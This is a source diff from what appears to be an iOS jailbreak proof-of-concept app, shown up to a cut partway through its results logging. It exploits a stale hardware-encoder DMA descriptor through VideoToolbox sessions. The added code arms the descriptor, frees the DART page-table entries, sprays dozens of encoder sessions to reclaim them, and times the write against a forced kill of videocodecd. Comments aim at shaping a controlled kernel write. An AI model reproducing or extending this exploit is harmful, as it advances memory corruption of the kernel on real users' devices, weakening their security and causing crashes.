@@ -3229,6 +3229,176 @@ static void runRunC2(void) {
 }
 
 // ============================================================
+// C2-EARLY-KILL: Discriminator — is fire daemon-coupled or kext timer?
+//
+// Arms Alpha=255, tears down session (like Mode A Phase 2+3),
+// then prompts user to kill videocodecd from Mac at T+15.
+// If panic at ~T+15 → fire is daemon-death-coupled → Mode A doomed
+// If panic at ~T+156 → fire is independent kext timer → Mode A viable
+// ============================================================
+
+static void runC2EarlyKill(void) {
+    if (g_phase2Running) {
+        INFO(@"Phase 2 test already running");
+        return;
+    }
+    g_phase2Running = YES;
+
+    os_log_t ekLog = os_log_create("com.jbpoc.c2ek", "discriminator");
+
+    pocLog(@"");
+    pocLog(@"╔══════════════════════════════════════════╗");
+    pocLog(@"║  C2-EARLY-KILL: Fire Coupling Test        ║");
+    pocLog(@"║  Arm → teardown → kill daemon at T+15     ║");
+    pocLog(@"║  *** WILL CAUSE KERNEL PANIC ***           ║");
+    pocLog(@"╚══════════════════════════════════════════╝");
+
+    exp3Mark(@"C2EK-START");
+
+    NSDateFormatter *fmt = [[NSDateFormatter alloc] init];
+    fmt.dateFormat = @"HH:mm:ss.SSS";
+
+    // Step 1: Arm
+    LOG(@"--- STEP 1: ARM ---");
+    NSDictionary *spec = @{
+        (NSString *)kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder: @YES,
+        (NSString *)kVTVideoEncoderSpecification_RequireHardwareAcceleratedVideoEncoder: @YES,
+    };
+
+    VTCompressionSessionRef session = NULL;
+    OSStatus status = VTCompressionSessionCreate(
+        kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
+        (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
+        narrowCallback, NULL, &session);
+
+    if (status != noErr) {
+        FAIL(@"Session creation failed: %d", (int)status);
+        g_phase2Running = NO;
+        return;
+    }
+
+    OSStatus ss = VTSessionSetProperty(session,
+        CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
+        (__bridge CFTypeRef)@(255));
+    if (ss != noErr) {
+        FAIL(@"Alpha SET rejected: %d", (int)ss);
+        VTCompressionSessionInvalidate(session);
+        CFRelease(session);
+        g_phase2Running = NO;
+        return;
+    }
+
+    status = VTCompressionSessionPrepareToEncodeFrames(session);
+    if (status != noErr) {
+        FAIL(@"Prepare failed: %d", (int)status);
+        VTCompressionSessionInvalidate(session);
+        CFRelease(session);
+        g_phase2Running = NO;
+        return;
+    }
+
+    CVPixelBufferRef pb = createTestPixelBuffer(320, 240);
+    if (!pb) {
+        FAIL(@"Pixel buffer failed");
+        VTCompressionSessionInvalidate(session);
+        CFRelease(session);
+        g_phase2Running = NO;
+        return;
+    }
+
+    g_narrowGotOutput = NO;
+
+    NSString *armTime = [fmt stringFromDate:[NSDate date]];
+    LOG(@"ARM: %@", armTime);
+    os_log(ekLog, "C2EK-ARM %{public}@", armTime);
+
+    status = VTCompressionSessionEncodeFrame(session, pb,
+        CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
+    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
+    [NSThread sleepForTimeInterval:2.0];
+    CVPixelBufferRelease(pb);
+
+    BOOL armed = !g_narrowGotOutput;
+    if (!armed) {
+        FAIL(@"Arm failed — got output, no -17691");
+        VTCompressionSessionInvalidate(session);
+        CFRelease(session);
+        exp3Mark(@"C2EK-ARM-FAILED");
+        g_phase2Running = NO;
+        return;
+    }
+    PASS(@"Armed — -17691 confirmed");
+    exp3Mark(@"C2EK-ARMED");
+
+    // Step 2: Teardown (like Mode A Phase 3)
+    LOG(@"--- STEP 2: TEARDOWN ---");
+    NSDate *freeTime = [NSDate date];
+    NSString *freeTimeStr = [fmt stringFromDate:freeTime];
+    VTCompressionSessionInvalidate(session);
+    CFRelease(session);
+    session = NULL;
+
+    [NSThread sleepForTimeInterval:0.5];
+    PASS(@"Session torn down at %@. Stale DVA live.", freeTimeStr);
+    os_log(ekLog, "C2EK-FREED %{public}@", freeTimeStr);
+    exp3Mark(@"C2EK-FREED");
+
+    // Step 3: Wait — prompt for Mac-side kill at T+15
+    pocLog(@"");
+    LOG(@"╔══════════════════════════════════════════════════╗");
+    LOG(@"║  KILL videocodecd FROM MAC AT T+15!               ║");
+    LOG(@"║                                                   ║");
+    LOG(@"║  From Mac terminal:                               ║");
+    LOG(@"║    xcrun devicectl device process kill             ║");
+    LOG(@"║      --device <UDID> --name videocodecd           ║");
+    LOG(@"║                                                   ║");
+    LOG(@"║  Or via lldb:                                     ║");
+    LOG(@"║    process attach --name videocodecd && kill       ║");
+    LOG(@"║                                                   ║");
+    LOG(@"║  INTERPRETATION:                                  ║");
+    LOG(@"║  Panic at ~T+15 → fire is daemon-coupled          ║");
+    LOG(@"║    → Mode A structurally doomed                   ║");
+    LOG(@"║  Panic at ~T+156 → fire is kext timer             ║");
+    LOG(@"║    → Mode A viable (coverage problem)             ║");
+    LOG(@"║  No panic → unexpected                            ║");
+    LOG(@"╚══════════════════════════════════════════════════╝");
+    pocLog(@"");
+
+    LOG(@"ARM: %@ | FREE: %@", armTime, freeTimeStr);
+    LOG(@"Logging every second — last line before panic is the answer.");
+    pocLog(@"");
+
+    for (int s = 1; s <= 300; s++) {
+        [NSThread sleepForTimeInterval:1.0];
+        int elapsed = (int)[[NSDate date] timeIntervalSinceDate:freeTime];
+        NSString *now = [fmt stringFromDate:[NSDate date]];
+
+        if (s <= 30 || s % 10 == 0) {
+            LOG(@"T+%03ds: %@ — alive%s", elapsed, now,
+                (s == 15) ? " ← KILL NOW" : "");
+        }
+        if (s == 15) {
+            PASS(@"*** T+15 — KILL videocodecd NOW ***");
+            os_log(ekLog, "C2EK-KILL-WINDOW T+15");
+            exp3Mark(@"C2EK-KILL-WINDOW-T+15");
+        }
+        if (s % 30 == 0) {
+            os_log(ekLog, "C2EK-ALIVE T+%ds %{public}@", elapsed, now);
+            exp3Mark([NSString stringWithFormat:@"C2EK-alive-T+%d", elapsed]);
+        }
+    }
+
+    pocLog(@"");
+    PASS(@"=== C2-EARLY-KILL: NO PANIC IN 5 MIN ===");
+    INFO(@"If daemon was killed: fire may require daemon alive (daemon-coupled).");
+    INFO(@"If daemon was NOT killed: same as previous runs.");
+    os_log(ekLog, "C2EK-NO-PANIC arm=%{public}@ free=%{public}@", armTime, freeTimeStr);
+    exp3Mark(@"C2EK-NO-PANIC");
+
+    g_phase2Running = NO;
+}
+
+// ============================================================
 // D-PREP: In-place readout — test Model (b)
 //
 // Model (b): firmware writes through the stale descriptor CONTINUOUSLY
@@ -4420,50 +4590,44 @@ static void runDPrep2(void) {
 }
 
 // ============================================================
-// EXPERIMENT 3.0: Mode A — Clone-Session Bitstream-Diff
+// EXPERIMENT 3.0: Mode A3 — PTE Spray + Soak + Uncover Oracle
 //
-// The gating question is resolved: AXI_ID 0xc0 writes to an
-// INTERNAL driver-owned coded-output buffer. App-side IOSurfaces
-// never enter the AVE DART aperture — only the kext maps surfaces
-// into the encoder's DART pool via DARTMapInternalSurfaces during
-// session CONFIGURE. A bare IOSurface spray stays in the generic
-// allocator and can never re-claim the freed encoder PTE slots.
+// A2 learnings: encodes are wedged post-arm (videocodecd dies),
+// PTE 0x3bc vs 0x3cc is cross-boot jitter (not identity effect),
+// and the fire PTE is baked at arm time. Identity-matching is dead.
 //
-// The re-claim IS the clone: an identity-clone session drives
-// the same internal surface allocation through the same bump
-// allocator. Cross-boot PTE determinism (PTEs 0x1c4-0x20b across
-// 8 panics) means identical parameters land the coded buffer on
-// the recycled DVA — no spray, no size matching needed.
+// A3 strategy: maximize DART PTE coverage with many sessions
+// (PrepareToEncodeFrames only — no encodes, no XPC dependency).
+// Binary oracle: survive T+300 = spray absorbed the stale write.
+// Then uncover (teardown all) + wait 180s for confirmation.
 //
-// Detection: we can't read the clone's internal coded buffer
-// directly. Instead we diff the clone's CMSampleBuffer bitstream
-// output against a clean-clone baseline. Anomalous bytes at fixed
-// offsets = the stale DMA write corrupted the coded buffer before
-// the ISR memcpy (dva+0x1270, length 0x9400) copied it out.
-//
-// PREREQUISITE: Run D-prep-2 and C2 first!
-//   - D-prep-2 (keep-alive): tests if the write lands while PTEs
-//     are still valid (model b). If yes, Mode A is unnecessary —
-//     the primitive is "arm, keep alive, read output."
-//   - C2 (kill→fire latency): measures the re-claim window.
-//     If fire ≈ instantaneous with teardown (F≈U), no time to
-//     clone before panic. Mode A needs the keep-alive variant.
+// PREREQUISITE: Run C2-EK first to confirm fire is kext-timer,
+// not daemon-coupled. If daemon-coupled, Mode A is doomed.
 //
 // Phases:
-// 1. BASELINE: Clean session, encode N frames, collect checksums
+// 1. BASELINE: Clean session output (encoder works pre-arm)
 // 2. ARM: AlphaLayerID=255, encode → -17691, DMA armed
 // 3. FREE: Tear down armed session → DART PTEs freed
-// 4. CLONE: Fresh session with identical config (Alpha=0), encode
-//    frames — its CONFIGURE re-claims the coded-output DVA slot
-// 5. DIFF: Compare clone output bitstreams against baseline
+// 4. SPRAY: Create N sessions (thin + fat), PrepareToEncode only
+// 5. SOAK: Wait 300s — survive = absorbed, panic = missed
+// 6. UNCOVER: Teardown all, wait 180s — confirm single-fire
 // ============================================================
 
 #define EXP3_BASELINE_FRAMES   5
-#define EXP3_CLONE_FRAMES     30
-#define EXP3_POLL_SECS       200
+#define EXP3_SOAK_SECS       300
+#define EXP3_UNCOVER_SECS    180
 
 static volatile BOOL g_exp3Armed = NO;
 static volatile int g_exp3EncodeStatus = 0;
+static volatile BOOL g_exp3Running = NO;
+
+static void exp3Mark(NSString *phase) {
+    NSString *p = [NSHomeDirectory()
+        stringByAppendingPathComponent:@"Documents/exp3_phases.txt"];
+    NSString *line = [NSString stringWithFormat:@"%@ %@\n", [NSDate date], phase];
+    FILE *f = fopen(p.fileSystemRepresentation, "a");
+    if (f) { fwrite(line.UTF8String, 1, strlen(line.UTF8String), f); fclose(f); }
+}
 
 static void exp3ArmCallback(
     void *ctx, void *sourceFrameRefCon, OSStatus status,
@@ -4484,7 +4648,7 @@ static void exp3ArmCallback(
 }
 
 // Baseline/clone output collection
-#define EXP3_MAX_SAMPLES 64
+#define EXP3_MAX_SAMPLES 256
 static CMSampleBufferRef g_exp3Samples[EXP3_MAX_SAMPLES];
 static volatile int g_exp3SampleCount = 0;
 static volatile int g_exp3SampleErrors = 0;
@@ -4526,8 +4690,8 @@ static void exp3FreeSamples(void) {
     g_exp3SampleErrors = 0;
 }
 
-static VTCompressionSessionRef exp3CreateSession(
-    void *callback, BOOL setAlpha255) {
+static VTCompressionSessionRef exp3CreateSessionEx(
+    void *callback, int width, int height, BOOL setAlpha255) {
     NSDictionary *spec = @{
         (NSString *)kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder: @YES,
         (NSString *)kVTVideoEncoderSpecification_RequireHardwareAcceleratedVideoEncoder: @YES,
@@ -4535,30 +4699,37 @@ static VTCompressionSessionRef exp3CreateSession(
 
     VTCompressionSessionRef session = NULL;
     OSStatus status = VTCompressionSessionCreate(
-        kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
+        kCFAllocatorDefault, width, height, kCMVideoCodecType_HEVC,
         (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
         (VTCompressionOutputCallback)callback, NULL, &session);
 
-    if (status != noErr) {
-        FAIL(@"Session creation failed: %d", (int)status);
-        return NULL;
-    }
+    if (status != noErr) return NULL;
 
     if (setAlpha255) {
-        VTSessionSetProperty(session,
+        OSStatus ss = VTSessionSetProperty(session,
             CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
             (__bridge CFTypeRef)@(255));
+        if (ss != noErr) {
+            FAIL(@"Alpha SET rejected: %d", (int)ss);
+            VTCompressionSessionInvalidate(session);
+            CFRelease(session);
+            return NULL;
+        }
     }
 
     status = VTCompressionSessionPrepareToEncodeFrames(session);
     if (status != noErr) {
-        FAIL(@"PrepareToEncode failed: %d", (int)status);
         VTCompressionSessionInvalidate(session);
         CFRelease(session);
         return NULL;
     }
 
     return session;
+}
+
+static VTCompressionSessionRef exp3CreateSession(
+    void *callback, BOOL setAlpha255) {
+    return exp3CreateSessionEx(callback, 320, 240, setAlpha255);
 }
 
 static CVPixelBufferRef exp3CreatePixelBuffer(uint8_t yFill, uint8_t uvFill) {
@@ -4584,24 +4755,25 @@ static CVPixelBufferRef exp3CreatePixelBuffer(uint8_t yFill, uint8_t uvFill) {
 }
 
 static void runExp3_ModeA(void) {
+    if (g_exp3Running) {
+        INFO(@"Exp 3 already running — ignoring duplicate tap");
+        return;
+    }
+    g_exp3Running = YES;
+
     pocLog(@"");
     pocLog(@"╔═══════════════════════════════════════════╗");
-    pocLog(@"║  EXPERIMENT 3.0: Mode A Clone-Session     ║");
-    pocLog(@"║  Bitstream-Diff DART Re-claim             ║");
+    pocLog(@"║  EXPERIMENT 3.0: Mode A3 PTE Spray        ║");
+    pocLog(@"║  No-encode spray + soak + uncover oracle  ║");
     pocLog(@"║  *** WILL LIKELY CAUSE KERNEL PANIC ***   ║");
     pocLog(@"╚═══════════════════════════════════════════╝");
     pocLog(@"");
 
-    INFO(@"PREREQUISITE: Run D-prep-2 and C2 first!");
-    INFO(@"D-prep-2 tests if write lands while PTEs are valid (model b).");
-    INFO(@"C2 measures the re-claim window (kill→fire latency).");
-    INFO(@"If D-prep-2 hits, Mode A is unnecessary.");
-    INFO(@"If C2 shows fire≈kill, Mode A can't sequence in time.");
-    pocLog(@"");
-
     os_log_t eLog = os_log_create("com.research.jbpoc", "exp3");
+    exp3Mark(@"START");
 
     // ---- PHASE 1: BASELINE ----
+    exp3Mark(@"P1-baseline-start");
     LOG(@"═══ PHASE 1: BASELINE (clean session output) ═══");
     LOG(@"Collecting %d clean encode outputs as reference...", EXP3_BASELINE_FRAMES);
 
@@ -4610,6 +4782,7 @@ static void runExp3_ModeA(void) {
         (void *)exp3CollectCallback, NO);
     if (!baseSession) {
         FAIL(@"Could not create baseline session");
+        g_exp3Running = NO;
         return;
     }
     PASS(@"Baseline HEVC 320x240 session created");
@@ -4657,7 +4830,8 @@ static void runExp3_ModeA(void) {
     exp3FreeSamples();
 
     if (baselineData.count == 0) {
-        FAIL(@"No baseline data collected — cannot diff");
+        FAIL(@"No baseline data collected");
+        g_exp3Running = NO;
         return;
     }
 
@@ -4667,6 +4841,7 @@ static void runExp3_ModeA(void) {
     [NSThread sleepForTimeInterval:2.0];
 
     // ---- PHASE 2: ARM ----
+    exp3Mark(@"P2-arm-start");
     LOG(@"");
     LOG(@"═══ PHASE 2: ARM (AlphaLayerID=255) ═══");
 
@@ -4676,6 +4851,7 @@ static void runExp3_ModeA(void) {
         (void *)exp3ArmCallback, YES);
     if (!armSession) {
         FAIL(@"Could not create armed session");
+        g_exp3Running = NO;
         return;
     }
     PASS(@"Armed HEVC 320x240 session created (AlphaLayerID=255)");
@@ -4702,12 +4878,16 @@ static void runExp3_ModeA(void) {
         VTCompressionSessionInvalidate(armSession);
         CFRelease(armSession);
         CVPixelBufferRelease(armPB);
+        exp3Mark(@"P2-arm-FAILED");
+        g_exp3Running = NO;
         return;
     }
+    exp3Mark(@"P2-armed");
 
     os_log(eLog, "JBPoC-EXP3 PHASE2 armed=YES");
 
     // ---- PHASE 3: FREE ----
+    exp3Mark(@"P3-free-start");
     LOG(@"");
     LOG(@"═══ PHASE 3: FREE (Session teardown) ═══");
     LOG(@"Invalidating armed session — DART PTEs freed,");
@@ -4726,279 +4906,155 @@ static void runExp3_ModeA(void) {
     PASS(@"Armed session torn down. Stale DVA is live.");
     LOG(@"Survived 0.5s post-teardown — F≈U not immediate.");
     os_log(eLog, "JBPoC-EXP3 PHASE3 freed survived_500ms");
+    exp3Mark(@"P3-freed");
 
-    // ---- PHASE 4: CLONE ----
+    // ---- PHASE 4: SPRAY (create-only, no encodes) ----
+    exp3Mark(@"P4-spray-start");
     LOG(@"");
-    LOG(@"═══ PHASE 4: CLONE (Identity re-claim) ═══");
-    LOG(@"Creating clone session with IDENTITY-MATCHED config (Alpha=255).");
-    LOG(@"Its CONFIGURE drives DARTMapInternalSurfaces through the");
-    LOG(@"same bump allocator with same InfoSet → coded-output lands on");
-    LOG(@"the SAME PTE slot as the armed session's stale descriptor.");
+    LOG(@"═══ PHASE 4: SPRAY (PTE coverage — no encodes) ═══");
+    LOG(@"*** MODE A3: Create-only spray + soak + uncover oracle ***");
+    LOG(@"A2 confirmed: encodes are wedged (videocodecd dies with arm).");
+    LOG(@"Only PrepareToEncodeFrames needed — that triggers DARTMapInternalSurfaces.");
+    LOG(@"PTE 0x3bc vs 0x3cc is cross-boot jitter, not identity effect.");
+    LOG(@"Strategy: maximize PTE coverage with thin + fat sessions.");
 
     exp3FreeSamples();
-    VTCompressionSessionRef cloneSession = exp3CreateSession(
-        (void *)exp3CollectCallback, YES);
-    if (!cloneSession) {
-        FAIL(@"Clone session creation failed");
-        INFO(@"If device panics shortly, F≈U confirmed — stale descriptor");
-        INFO(@"fired before clone could map. Need keep-alive variant.");
-        INFO(@"Check .ips: DVA in freed PTE range → ARM→FREE→CLONE can't sequence.");
-        return;
-    }
-    PASS(@"Clone session created — internal surfaces re-mapped");
-    LOG(@"If the bump allocator recycled the armed DVA, the clone's");
-    LOG(@"coded-output buffer now sits at the stale descriptor's target.");
-    LOG(@"*** MODE A2: Identity-matched clone (Alpha=255 both sides) ***");
-    LOG(@"A1 showed PTE 0x3cc — outside 0x1c4-0x20b range. Alpha=0 clone");
-    LOG(@"got different InfoSet → different PTE slots. Now matching Alpha=255");
-    LOG(@"so bump allocator recycles the SAME slot. Clone may also -17691;");
-    LOG(@"that's expected — we need the MAPPING, not the encode output.");
-    LOG(@"If no panic past 200s → stale write landed in clone's buffer.");
-    LOG(@"Hunt +0xa8/+0xac/+0x1270 for corruption fingerprint.");
 
-    CVPixelBufferRef clonePB = exp3CreatePixelBuffer(0x80, 0x80);
-    if (!clonePB) {
-        FAIL(@"Clone pixel buffer failed");
-        VTCompressionSessionInvalidate(cloneSession);
-        CFRelease(cloneSession);
-        return;
-    }
+#define MAX_SPRAY_SESSIONS 50
+    VTCompressionSessionRef spraySessions[MAX_SPRAY_SESSIONS];
+    int sprayCount = 0;
 
-    os_log(eLog, "JBPoC-EXP3 PHASE4 clone_created");
-
-    // Encode frames through clone and collect output
-    LOG(@"Encoding %d frames through clone session...", EXP3_CLONE_FRAMES);
-
-    for (int i = 0; i < EXP3_CLONE_FRAMES; i++) {
-        CMTime pts = CMTimeMake(i, 30);
-        VTCompressionSessionEncodeFrame(cloneSession, clonePB, pts,
-            kCMTimeInvalid, NULL, NULL, NULL);
-
-        // Flush periodically so we get outputs during the wait window
-        if ((i + 1) % 5 == 0) {
-            VTCompressionSessionCompleteFrames(cloneSession, kCMTimeInvalid);
-            [NSThread sleepForTimeInterval:0.1];
+    // Step 1: thin sprays (320x240, Alpha=255) — same footprint as armed
+    LOG(@"Creating thin spray sessions (320x240, Alpha=255)...");
+    for (int i = 0; i < 20 && sprayCount < MAX_SPRAY_SESSIONS; i++) {
+        VTCompressionSessionRef s = exp3CreateSession(
+            (void *)exp3CollectCallback, YES);
+        if (!s) {
+            LOG(@"Thin spray stopped at %d", i);
+            break;
+        }
+        spraySessions[sprayCount++] = s;
+        if ((i + 1) % 5 == 0 || i == 0) {
+            INFO(@"Thin spray %d created (total: %d)", i + 1, sprayCount);
         }
     }
-    VTCompressionSessionCompleteFrames(cloneSession, kCMTimeInvalid);
-    [NSThread sleepForTimeInterval:1.0];
+    int thinCount = sprayCount;
+    exp3Mark([NSString stringWithFormat:@"P4-thin=%d", thinCount]);
 
-    int cloneCount = g_exp3SampleCount;
-    PASS(@"Clone collected: %d samples, %d errors",
-         cloneCount, g_exp3SampleErrors);
-    os_log(eLog, "JBPoC-EXP3 PHASE4 clone_samples=%d errors=%d",
-           cloneCount, g_exp3SampleErrors);
+    // Step 2: fat sprays (1920x1080) — larger PTE footprint per session
+    LOG(@"Creating fat spray sessions (1920x1080, no Alpha)...");
+    for (int i = 0; sprayCount < MAX_SPRAY_SESSIONS; i++) {
+        VTCompressionSessionRef s = exp3CreateSessionEx(
+            (void *)exp3CollectCallback, 1920, 1080, NO);
+        if (!s) {
+            LOG(@"Fat spray stopped at %d", i);
+            break;
+        }
+        spraySessions[sprayCount++] = s;
+        INFO(@"Fat spray %d created (total: %d)", i + 1, sprayCount);
+    }
+    int fatCount = sprayCount - thinCount;
+    exp3Mark([NSString stringWithFormat:@"P4-fat=%d total=%d", fatCount, sprayCount]);
 
-    // ---- Now wait for the stale descriptor to fire ----
+    PASS(@"Spray complete: %d thin + %d fat = %d sessions holding DART PTEs",
+         thinCount, fatCount, sprayCount);
+    os_log(eLog, "JBPoC-EXP3 PHASE4 thin=%d fat=%d total=%d",
+           thinCount, fatCount, sprayCount);
+
+    // ---- PHASE 5: SOAK (wait for stale DMA with spray alive) ----
+    exp3Mark(@"P5-soak-start");
     LOG(@"");
-    LOG(@"Waiting for stale DMA fire while clone session holds PTEs...");
-    LOG(@"Continuing to encode through clone every 10s to produce");
-    LOG(@"bitstreams that may carry corruption from the stale write.");
+    LOG(@"═══ PHASE 5: SOAK (binary oracle — %ds) ═══", EXP3_SOAK_SECS);
+    LOG(@"All %d spray sessions alive, holding DART PTEs.", sprayCount);
+    LOG(@"No encodes — videocodecd is wedged post-arm.");
+    LOG(@"Stale DMA fires ~156s after teardown.");
+    LOG(@"*** ORACLE: survive past T+%d → write absorbed by spray PTE ***", EXP3_SOAK_SECS);
+    LOG(@"***         panic at ~T+156 → spray did NOT cover armed PTE ***");
 
     int elapsed0 = (int)[[NSDate date] timeIntervalSinceDate:freeTime];
-    int remainWait = EXP3_POLL_SECS - elapsed0;
-    if (remainWait < 30) remainWait = 30;
+    int soakRemain = EXP3_SOAK_SECS - elapsed0;
+    if (soakRemain < 60) soakRemain = 60;
+    LOG(@"T+%ds since teardown. Soaking %ds more (to ~T+%d)...",
+        elapsed0, soakRemain, elapsed0 + soakRemain);
 
-    for (int sec = 0; sec < remainWait; sec += 10) {
+    for (int sec = 0; sec < soakRemain; sec += 10) {
         [NSThread sleepForTimeInterval:10.0];
         int elapsed = (int)[[NSDate date] timeIntervalSinceDate:freeTime];
-
-        // Encode a batch through clone to sample the coded buffer state
-        for (int f = 0; f < 3; f++) {
-            CMTime pts = CMTimeMake(cloneCount + f, 30);
-            VTCompressionSessionEncodeFrame(cloneSession, clonePB, pts,
-                kCMTimeInvalid, NULL, NULL, NULL);
+        INFO(@"T+%03ds: alive (%d sessions holding PTEs)", elapsed, sprayCount);
+        if (sec % 30 == 0) {
+            exp3Mark([NSString stringWithFormat:@"P5-soak-T+%d", elapsed]);
         }
-        VTCompressionSessionCompleteFrames(cloneSession, kCMTimeInvalid);
-        [NSThread sleepForTimeInterval:0.5];
-
-        int newCount = g_exp3SampleCount;
-        INFO(@"T+%03ds: %d total samples collected (clone alive)", elapsed, newCount);
     }
 
-    int finalCount = g_exp3SampleCount;
+    PASS(@"*** SOAK SURVIVED T+%ds — stale DMA likely absorbed ***", EXP3_SOAK_SECS);
+    os_log(eLog, "JBPoC-EXP3 PHASE5 SOAK_SURVIVED sprays=%d", sprayCount);
+    exp3Mark(@"P5-SOAK-SURVIVED");
+
+    // ---- PHASE 6: UNCOVER (teardown all, confirm absorption) ----
+    exp3Mark(@"P6-uncover-start");
     LOG(@"");
-    LOG(@"Total samples: %d (baseline: %d)", finalCount, baselineCount);
+    LOG(@"═══ PHASE 6: UNCOVER (confirm reclaim — %ds) ═══", EXP3_UNCOVER_SECS);
+    LOG(@"Tearing down ALL spray sessions to free their PTEs.");
+    LOG(@"If firmware has further deferred writes, uncovered PTEs");
+    LOG(@"will cause a panic. If single fire event: already absorbed,");
+    LOG(@"no more writes, no panic. Both outcomes are informative.");
 
-    // ---- PHASE 5: DIFF ----
-    LOG(@"");
-    LOG(@"═══ PHASE 5: DIFF (Bitstream comparison) ═══");
-    LOG(@"Comparing clone outputs against baseline...");
-    LOG(@"Corruption signature: anomalous bytes, especially near");
-    LOG(@"DVA+0x1270 region (ISR memcpy copies 0x9400 bytes from there).");
+    for (int i = 0; i < sprayCount; i++) {
+        VTCompressionSessionInvalidate(spraySessions[i]);
+        CFRelease(spraySessions[i]);
+    }
+    sprayCount = 0;
+    int uncoverT = (int)[[NSDate date] timeIntervalSinceDate:freeTime];
+    PASS(@"All sessions torn down at T+%d. Waiting %ds...", uncoverT, EXP3_UNCOVER_SECS);
+    exp3Mark([NSString stringWithFormat:@"P6-teardown-T+%d", uncoverT]);
 
-    int hitCount = 0;
-    int firstHitFrame = -1;
-    NSMutableString *hitReport = [NSMutableString string];
-
-    for (int i = 0; i < finalCount; i++) {
-        NSData *cloneBS = exp3GetBitstreamData(g_exp3Samples[i]);
-        if (!cloneBS || cloneBS.length == 0) continue;
-
-        // Compare against baseline frame (wrap around)
-        int baseIdx = i % baselineData.count;
-        NSData *baseBS = baselineData[baseIdx];
-
-        if (baseBS.length == 0) continue;
-
-        // Size difference is a signal
-        if (cloneBS.length != baseBS.length) {
-            hitCount++;
-            if (firstHitFrame < 0) firstHitFrame = i;
-            NSString *msg = [NSString stringWithFormat:
-                @"Frame %d: SIZE DIFF baseline=%zu clone=%zu",
-                i, baseBS.length, cloneBS.length];
-            PASS(@"*** HIT: %@ ***", msg);
-            [hitReport appendFormat:@"%@\n", msg];
-            os_log(eLog, "JBPoC-EXP3 DIFF-HIT frame=%d sizeDiff base=%zu clone=%zu",
-                   i, baseBS.length, cloneBS.length);
-            continue;
-        }
-
-        // Byte-level diff
-        const uint8_t *baseBytes = baseBS.bytes;
-        const uint8_t *cloneBytes = cloneBS.bytes;
-        size_t len = MIN(baseBS.length, cloneBS.length);
-
-        int diffs = 0;
-        int firstDiffOff = -1;
-
-        for (size_t j = 0; j < len; j++) {
-            if (baseBytes[j] != cloneBytes[j]) {
-                if (diffs == 0) firstDiffOff = (int)j;
-                diffs++;
-            }
-        }
-
-        if (diffs > 0) {
-            // Is this an expected difference (different encode, frame number, etc)?
-            // Frames with same index against same baseline should be very close.
-            // Large diff counts or diffs in unusual regions are the signal.
-            if (i < baselineCount) {
-                // Same frame index as baseline — should be near-identical
-                // (same input, same config, same encoder state)
-                hitCount++;
-                if (firstHitFrame < 0) firstHitFrame = i;
-
-                PASS(@"*** HIT: Frame %d: %d bytes differ (first at 0x%x) ***",
-                     i, diffs, firstDiffOff);
-
-                // Dump first 32 differences
-                NSMutableString *hex = [NSMutableString string];
-                int dumped = 0;
-                for (size_t j = (size_t)firstDiffOff; j < len && dumped < 32; j++) {
-                    if (baseBytes[j] != cloneBytes[j]) {
-                        [hex appendFormat:@"%04zx:%02x→%02x ", j, baseBytes[j], cloneBytes[j]];
-                        dumped++;
-                    }
-                }
-                LOG(@"  Diff: %@", hex);
-                [hitReport appendFormat:@"Frame %d: %d diffs at 0x%x\n", i, diffs, firstDiffOff];
-
-                os_log(eLog, "JBPoC-EXP3 DIFF-HIT frame=%d diffs=%d first=0x%x",
-                       i, diffs, firstDiffOff);
-            } else {
-                // Later frame — diff is expected (different frame number), just log
-                INFO(@"Frame %d: %d byte diffs vs baseline[%d] (expected for later frames)",
-                     i, diffs, baseIdx);
-            }
-        } else if (i < baselineCount) {
-            INFO(@"Frame %d: identical to baseline (no corruption)", i);
+    for (int sec = 0; sec < EXP3_UNCOVER_SECS; sec += 10) {
+        [NSThread sleepForTimeInterval:10.0];
+        int elapsed = (int)[[NSDate date] timeIntervalSinceDate:freeTime];
+        INFO(@"T+%03ds: alive post-uncover", elapsed);
+        if (sec % 30 == 0) {
+            exp3Mark([NSString stringWithFormat:@"P6-T+%d", elapsed]);
         }
     }
 
-    // Also check input surface of clone (secondary: stale descriptor
-    // could stray onto external mappings — cheap and already proven)
-    IOSurfaceRef cloneInputSurf = CVPixelBufferGetIOSurface(clonePB);
-    int inputDiffs = 0;
-    if (cloneInputSurf) {
-        IOSurfaceLock(cloneInputSurf, kIOSurfaceLockReadOnly, NULL);
-        uint8_t *inputBase = (uint8_t *)IOSurfaceGetBaseAddress(cloneInputSurf);
-        size_t inputSize = IOSurfaceGetAllocSize(cloneInputSurf);
-        if (inputBase) {
-            for (size_t j = 0; j < inputSize; j++) {
-                if (inputBase[j] != 0x80) {
-                    inputDiffs++;
-                }
-            }
-        }
-        IOSurfaceUnlock(cloneInputSurf, kIOSurfaceLockReadOnly, NULL);
-        if (inputDiffs > 0) {
-            PASS(@"*** INPUT SURFACE HIT: %d bytes differ from 0x80 fill ***", inputDiffs);
-            os_log(eLog, "JBPoC-EXP3 INPUT-HIT diffs=%d", inputDiffs);
-        }
-    }
+    PASS(@"*** UNCOVER SURVIVED — single fire event absorbed ***");
+    os_log(eLog, "JBPoC-EXP3 PHASE6 UNCOVER_SURVIVED");
+    exp3Mark(@"P6-UNCOVER-SURVIVED");
 
     // ---- RESULTS ----
     pocLog(@"");
     LOG(@"═══════════════════════════════════════════════");
-    if (hitCount > 0) {
-        PASS(@"*** CLONE BITSTREAM CORRUPTION DETECTED ***");
-        LOG(@"Stale DMA write corrupted clone's coded-output buffer,");
-        LOG(@"and the corruption propagated into the bitstream output.");
-        LOG(@"Total anomalous frames: %d, first at frame %d", hitCount, firstHitFrame);
-        if (inputDiffs > 0) {
-            LOG(@"BONUS: Input surface also hit (%d bytes) — better primitive!", inputDiffs);
-        }
-        pocLog(@"");
-        LOG(@"This confirms:");
-        LOG(@"1. Clone re-claimed the armed DVA slot");
-        LOG(@"2. Firmware stale DMA landed in clone's coded buffer");
-        LOG(@"3. The corruption is observable through normal VT output");
-        LOG(@"Next: analyze corruption pattern for controlled write shaping");
